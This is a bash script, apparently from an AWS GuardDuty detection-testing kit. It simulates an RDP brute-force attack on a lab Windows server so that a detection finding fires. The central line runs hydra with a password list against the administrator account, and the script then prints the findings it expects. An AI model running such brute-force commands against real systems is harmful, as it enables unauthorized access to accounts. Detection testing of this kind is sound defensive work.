#Copyright 2017 Amazon.com, Inc. or its affiliates. All Rights Reserved.
#
#  Licensed under the Apache License, Version 2.0 (the "License").
#  You may not use this file except in compliance with the License.
#  A copy of the License is located at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
#  or in the "license" file accompanying this file. This file is distributed
#  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either
#  express or implied. See the License for the specific language governing
#  permissions and limitations under the License.

#!/bin/bash

# load IP addresses created by templates
source localIps.sh

# simulate external recon
#echo 'External port probe on a temporarily unprotected port'
echo '-----------------------------------------------------------------------'
echo
# 3 - rdp brute force with known user and list of passwords found on web
echo '***********************************************************************'
echo '* Test #3 - RDP Brute Force with Password List                        *'
echo '* This simulates an RDP brute force attack on the internal RDP port  *'
echo '* of the windows server that we installed in the environment.  It uses*'
echo '* a list of common passwords that can be found on the web. This test  *'
echo '* will trigger a detection, but will fail to get into the target      *'
echo '* windows instance.                                                   *'
echo '***********************************************************************'
echo
echo 'Sending 250 password attempts at the windows server...'
hydra -t 4 -f -l administrator -P ./passwords/password_list.txt rdp://$BASIC_WINDOWS_TARGET
echo
echo '-----------------------------------------------------------------------'
echo
echo 'Test 3: RDP Brute Force with Password List'
echo 'Expecting two findings - one for the outbound and one for the inbound detection'
echo 'Outbound: ' $RED_TEAM_INSTANCE ' is performing RDP brute force attacks against ' $BASIC_WINDOWS_TARGET
echo 'Inbound: ' $RED_TEAM_IP ' is performing RDP brute force attacks against ' $BASIC_WINDOWS_INSTANCE
echo 'Finding Type : UnauthorizedAccess:EC2/RDPBruteForce'
echo
